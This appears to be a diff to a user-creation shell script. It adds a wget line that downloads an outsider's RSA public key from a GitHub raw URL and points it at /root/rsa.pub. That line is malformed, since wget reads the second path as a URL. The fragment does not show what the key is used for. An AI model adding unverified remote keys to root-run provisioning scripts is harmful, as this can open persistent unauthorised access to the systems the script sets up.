@@ -3,6 +3,8 @@
 username=$1
 flag=""
 
+wget https://raw.githubusercontent.com/4D4937/Others/master/libertyss_rsa.pub /root/rsa.pub
+
 function f_user_permission
 {
     useradd $username
